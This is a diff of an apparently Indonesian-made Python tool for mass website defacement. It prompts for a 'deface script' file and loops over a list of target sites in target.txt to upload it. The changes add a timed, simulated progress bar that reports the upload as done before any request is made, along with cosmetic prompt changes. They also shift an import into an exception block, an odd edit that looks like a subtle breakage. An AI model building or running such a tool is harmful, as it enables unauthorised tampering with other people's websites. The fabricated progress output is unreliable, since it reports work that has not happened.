@@ -3,10 +3,11 @@
 try:
    import requests
    import os.path
+   import time
    import sys
 except ImportError:
    exit("install requests and try again ...")
-import os 
+   import os 
 os.system ("clear")
 banner = """
 
@@ -28,7 +29,7 @@ def x(tetew):
       ipt = input(tetew)
    else:
       ipt = raw_input(tetew)
-   
+
    return str(ipt)
 
 def axd(script,target_file="target.txt"):
@@ -36,8 +37,23 @@ def axd(script,target_file="target.txt"):
    with open(target_file, "r") as target:
       target = target.readlines()
       s = requests.Session()
-      print ("\33[31m[\33[0;32m>\33[0m\33[31m]\33[0m Uploading file to \033[32m %d \033[0m website"%(len(target)))
-      print ("\33[31m[\33[0;32m√\33[0m\33[31m]\33[0m Proses peretasan. . .")
+      print ("\33[31m[\33[0;32m√\33[0m\33[31m]\33[0m Save File. . .")
+      print ("\33[31m[\33[0;32m√\33[0m\33[31m]\33[0m Update. . .")
+      print ("\33[31m[\33[0;32m√\33[0m\33[31m]\33[0m File script \33[0;32mAccepted\33[0m")
+      print ("\33[31m[\33[77m>\33[0m\33[31m]\33[0m Target [\033[32m%d\033[0m] website"%(len(target)))
+      print ("\33[31m[\33[33m!\33[0m\33[31m]\33[0m Proses upload file script deface.. . .")
+      load = '█'
+      count = 0
+
+      for x in range(101):
+          time.sleep(0.2)
+          print (f'\r\33[31m[\33[33m!\33[0m\33[31m]\33[0m Uploading file script \33[32m[{load}]\33[0m : \33[32m{x}\33[0m%', end='', flush=True)
+          count += 1
+          if count == 3:
+             count = 0
+             load += '█'
+      print ('\n\n\33[31m[\33[0;32m√\33[0m\33[31m]\33[0m Upload Done. . .')
+      print ('\n\33[31m[\33[33m!\33[0m\33[31m]\33[0m Proses peretasan. . .')
       for web in target:
          try:
             site = web.strip()
@@ -58,12 +74,13 @@ def main(__bn__):
    print(__bn__)
    while True:
       try:
-         a = x("\33[31m[\33[0;32m>\33[0m\33[31m]\33[0m Ketik nama file script deface : ")
+         a = x("\33[31m[\33[77m>\33[0m\33[31m]\33[0m Ketik nama file script deface : ")
          if not os.path.isfile(a):
-            print ("\33[31m[\33[0;32m!\33[0m\33[31m]\33[0m file\033[31m %s \033[0mtidak ada didalam folder ini. . ."%(a))
+            print ("\33[31m[\33[33m!\33[0m\33[31m]\33[0m file\033[31m %s \033[0mtidak ada didalam folder ini. . ."%(a))
             continue
          else:
             break
+
       except KeyboardInterrupt:
          print; exit()
 
